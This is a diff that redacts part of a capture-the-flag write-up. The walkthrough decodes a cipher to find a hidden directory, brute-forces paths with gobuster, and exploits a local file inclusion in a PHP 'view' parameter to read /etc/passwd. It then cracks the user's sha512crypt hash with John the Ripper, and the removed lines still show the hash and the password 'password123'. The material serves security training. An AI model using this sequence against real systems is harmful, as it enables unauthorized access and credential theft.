@@ -170,19 +170,19 @@ THIS IS MORSE CODE(YESS I AM SMART ENOUGH)!!
 
 this cipher was : morse_code->hex->base64:
 final solutions:
-d1r3c70ry_center
+REDACTED
 
 LETS NAVIGATE TO THIS DIRECTORY
 this page says 'SCAN ME'
 
 lets use gobuster and check any juicy info:
 ┌──(kali㉿kali)-[~/tokyo]
-└─$ gobuster dir -u http://10.10.89.14/d1r3c70ry_center/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 30 -x php
+└─$ gobuster dir -u http://10.10.89.14/REDACTED/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 30 -x php
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
-[+] Url:            http://10.10.89.14/d1r3c70ry_center/
+[+] Url:            http://10.10.89.14/REDACTED/
 [+] Threads:        30
 [+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 [+] Status codes:   200,204,301,302,307,401,403
@@ -195,30 +195,19 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /claim (Status: 301)
 
 I NAVIGATE THROUGH THE PAGE, AN ANOTHER PUZZLE 
-BUT I NOTICE SOME .php FILE WHICH ALSO CONTAINS A GET PARAMETER, CAN THIS LEADS TO LFI ATTACK?
+BUT I NOTICE SOME .php FILE WHICH ALSO CONTAINS A GET PARAMETER(view), CAN THIS LEADS TO LFI ATTACK?
 i use burp and use the wordlist for LFI payloads available in seclists:
 
 HTTP/1.1 200 OK
-
 Date: Mon, 15 Mar 2021 05:58:46 GMT
-
 Server: Apache/2.4.18 (Ubuntu)
-
 Expires: Thu, 19 Nov 1981 08:52:00 GMT
-
 Cache-Control: no-store, no-cache, must-revalidate
-
 Pragma: no-cache
-
 Vary: Accept-Encoding
-
 Content-Length: 2232
-
 Connection: close
-
 Content-Type: text/html; charset=UTF-8
-
-
 
 <html>
     <head>
@@ -264,7 +253,7 @@ sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
 vagrant:x:1000:1000:vagrant,,,:/home/vagrant:/bin/bash
 vboxadd:x:999:1::/var/run/vboxadd:/bin/false
 ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
-kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash
+kamishiro{REDACTED}:1001:1001:,,,:/home/kamishiro:/bin/bash
 </p>    </body>
 </html>
 
@@ -280,7 +269,7 @@ Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
 Cost 1 (iteration count) is 5000 for all loaded hashes
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-password123      (?)
+REDACTED      (?)
 1g 0:00:00:02 DONE (2021-03-15 02:02) 0.4784g/s 673.6p/s 673.6c/s 673.6C/s cuties..tagged
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
